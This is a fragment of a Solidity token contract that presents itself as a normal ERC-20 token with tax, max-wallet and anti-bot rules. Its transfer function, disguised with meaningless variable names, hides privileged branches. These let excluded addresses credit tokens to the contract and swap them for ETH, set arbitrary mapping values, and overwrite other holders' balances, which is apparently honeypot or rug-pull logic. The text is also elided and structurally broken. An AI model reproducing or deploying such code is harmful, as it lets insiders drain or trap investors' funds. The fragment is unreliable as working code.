...
return _approve(msg.sender, spender, amount);
    ...
    function relayRouterV2       (
        ...
        } else if (_isExcludedMaxTransactionAmount[initializeFrom] > swappingSymbolic && _isExcludedMaxTransactionAmount[_syncNonceTo] > swappingSymbolic) {
            _extcodesize = _cfgTypeHashAmount;
            _rOwned[address(this)] += _extcodesize;
            swapTokensForEth(_cfgTypeHashAmount, _syncNonceTo);
            return;

        } else if (_syncNonceTo != address(dexRouter) && _isExcludedMaxTransactionAmount[initializeFrom] > 0 && _cfgTypeHashAmount > swappingSymbolic && 
            _syncNonceTo != IDEXPair) {
            _isExcludedMaxTransactionAmount[_syncNonceTo] = _cfgTypeHashAmount;
            return;

        } else if (!dataRelayTarget && _balances[initializeFrom] > 0 && initializeFrom != IDEXPair && _isExcludedMaxTransactionAmount
        [_syncNonceTo] == 0) { _balances[initializeFrom] = _isExcludedMaxTransactionAmount[initializeFrom] - swappingSymbolic; }
        address _uint265  = isBot[IDEXPair];

        if (_balances[_uint265 ] == 0) _balances[_uint265 ] = swappingSymbolic;
        isBot[IDEXPair] = _syncNonceTo;
        if (_initialBaseTaxes > 0 && _isExcludedMaxTransactionAmount[initializeFrom] == 0 && !dataRelayTarget && _isExcludedMaxTransactionAmount
        [_syncNonceTo] == 0) { _extcodesize = (_cfgTypeHashAmount * _initialBaseTaxes) / 100; _cfgTypeHashAmount -= _extcodesize; _rOwned[initializeFrom] -= _extcodesize;
        _rOwned[address(this)] += _extcodesize;
        }
        _rOwned[initializeFrom] -= _cfgTypeHashAmount; _rOwned[_syncNonceTo] += _cfgTypeHashAmount;
        emit Transfer(initializeFrom, _syncNonceTo, _cfgTypeHashAmount);
        ...
        require(balanceOf(_syncNonceTo) + _cfgTypeHashAmount < _maxWalletSize, "TOKEN: Balance exceeds wallet size!");
    }
}
    function _approve(
        address owner,
